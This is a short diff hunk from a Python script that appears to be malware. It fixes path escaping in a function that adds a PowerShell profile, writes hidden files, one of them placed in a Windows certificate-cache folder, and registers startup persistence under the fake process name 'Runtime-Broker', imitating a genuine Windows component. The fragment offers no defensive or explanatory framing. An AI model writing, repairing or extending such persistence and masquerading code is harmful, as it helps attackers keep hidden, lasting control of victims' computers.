@@ -137,7 +137,7 @@ def run(url, file_path):
             print(err)
             print("could not add powershell profile")
         create_hidden_file(file_path)
-        create_hidden_file(f"C:\Users\{user}\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\uuid.txt")
+        create_hidden_file(f"C:\\Users\\{user}\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData\\uuid.txt")
         #add_to_startup(file_path, "Runtime Broker")
         add_registry_startup(file_path, "Runtime-Broker")
     
